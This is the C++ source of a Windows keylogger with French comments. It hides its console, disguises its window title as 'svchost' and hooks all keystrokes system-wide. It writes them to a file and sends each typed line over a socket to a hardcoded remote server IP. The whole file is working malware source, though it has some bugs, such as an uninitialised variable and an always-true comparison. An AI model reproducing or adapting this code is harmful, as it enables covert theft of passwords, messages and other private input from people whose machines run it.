/*
Keylogger windows
Handle = ID vers un objet, une instance, une fenetre...
*/
#include <ctime>
#include <cstdlib>
#include <winsock2.h>
#include <windows.h>
#include <winable.h>
#include <conio.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <pthread.h>

using namespace std;

#define DEBUG 1
#define OUTFILE_NAME "Logs\\WinKey.log"		//Output file
#define CLASSNAME "winkey"
#define WINDOWTITLE "svchost"

char windir[MAX_PATH + 1];
HHOOK kbdhook;
bool running;
HWND hConsole;
string recupKBD;
SOCKET server;

HWND GetConsoleHwnd(void)
{
       #define MY_BUFSIZE 1024 // Buffer size for console window titles.
       HWND hwndFound;         // This is what is returned to the caller.
       char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
                                           // WindowTitle.
       char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
                                           // WindowTitle.
       // Fetch current window title.
       GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
       // Format a "unique" NewWindowTit
       wsprintf(pszNewWindowTitle,"%d/%d",
                   GetTickCount(),
                   GetCurrentProcessId());
       // Change current window title.
       SetConsoleTitle(pszNewWindowTitle);
       // Ensure window title has been updated.
       Sleep(40);
       // Look for NewWindowTitle.
       hwndFound=FindWindow(NULL, pszNewWindowTitle);
       // Restore original window title.
       SetConsoleTitle(pszOldWindowTitle);
       return(hwndFound);
}

SOCKET co()
{
    WSADATA WSAData;

    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.1.20"); // replace the ip with your futur server ip address. If server AND client are running on the same computer, you can use the local ip 127.0.0.1
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4443);
    int answer;
    while (answer != 0)
    {
		answer = WSAConnect(server, (SOCKADDR *)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
    }
    return server;

}
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)		//fonction appellée à chaque frappe de clavier
{

	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN))
	{
	    string const path = "C:\\logfile.txt";
        ofstream outfile(path.c_str(), ios::trunc);
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = {0}; //Déclaration d'un tableau de char de 255 (0xff) ou toutes les case = 0
		string str;
		DWORD msg = 1; //DWORD est un int de 32bit
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp); //Recupere le code de la touche enfoncée
		bool printable = false; //bool pour savoir si le char est ecrivable

		msg += (st_hook.scanCode << 16); //décalage de code de touche en bin de 16 bits sur la gauche et atribution a la var msg
		msg += (st_hook.flags << 24); //décalage de quelque-chose de 24 bits sur la gauche (je suis largé)
		GetKeyNameText(msg, tmp, 0xFF); //récupération du texte de la touche
		str = string(tmp); //conversion du text en int en acsii
		if (str.length() != 1)
		{
			if (str == "entree" || str == "ENTREE")
			{
				send(server, recupKBD.c_str(), recupKBD.size(), 0);
				recupKBD = "";
                outfile << "\n";
			}
			else if (str == "espace" || str == "ESPACE") 		//Si ce sont  des trucs speciaux alors attribution du char equivalent
			{
				recupKBD += " ";
				outfile << " ";
			}
			else if (str == "VERR.MAJ" || str == "verr.maj")
				capslock = !capslock;			//Si ce sont des maj alors changement des booleans caps et shift
			else if (str == "maj" || str == "MAJ")
				shift = true;
			else if (str == "TAB" || str == "tab")
			{
				recupKBD += "\t";
                outfile << "\t";
			}
            else if (str == "RET.ARR" || "str == ret.arr")
            {
            	recupKBD += "\b";
                outfile << "\b";
            }

			else
			{
				recupKBD += str;
				outfile << str;
			}
		}
        else
        {
            if (shift == capslock)
			{
				for (size_t i = 0; i < str.length(); i++) //Si shift activé et capslock activé alors: minuscule; si shift et capslock désactivé alors: minuscules
					str[i] = tolower(str[i]);
			}
			else
			{
				for (size_t i = 0; i <str.length(); i++) //Si shift activé et capslock désactivé ou vice-versa alors: conversion en majuscule
					if (str[i] >= 'A' && str[i] <= 'Z')
						str[i] = toupper(str[i]);
			}
			shift = false;
			recupKBD += str;
			outfile << str;
        }

    	outfile.close();
    }


		// string path = string(windir) + "\\" + OUTFILE_NAME; //Définition de l'endroit de save du txt
		// ofstream outfile(path.c_str(), ios_base::app); //Déclaration du flux avec conversion de string path en tab de char
		// outfile << str; //Enregistrement de la string
		// outfile.close(); //fermeture du flux
return CallNextHookEx(kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) //HWND = addresse de la page, msf = message du handle(HWND), wp et lp : paramètres
{
	switch(msg)
	{
		case WM_CLOSE: case WM_DESTROY:
		running = false;						//Honnetement jsp ce que ca fout la
		break;
		default:
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline, int ncmdshow) //handler de l'instance, handler de la previnstance; pointeur ver string,
{
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
    SOCKET serv = co();
	//Set up window
	HWND hwnd;
	HWND fgwindow = GetForegroundWindow(); //Récuperation du handler de la fenetre actuelle
	MSG msg;
	WNDCLASSEX windowclass;
	HINSTANCE modulehandle;

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);		//Définition de la fenetre et de tout le bordel windows
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(hwnd))
		return 1;

	if (DEBUG)
		ShowWindow(hwnd, SW_HIDE);		//Si sa bug on affiche la fenetre
	else
		ShowWindow(hwnd, SW_HIDE); //Si sa bug pas on la cache
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow);

	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, 0);		//Récupération du handle du clavier
	running = true;
	GetWindowsDirectory((LPSTR)windir, MAX_PATH);

	while(running)
	{
		if (!GetMessage(&msg, NULL, 0,0))
			running = false;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}


	return 0;
}



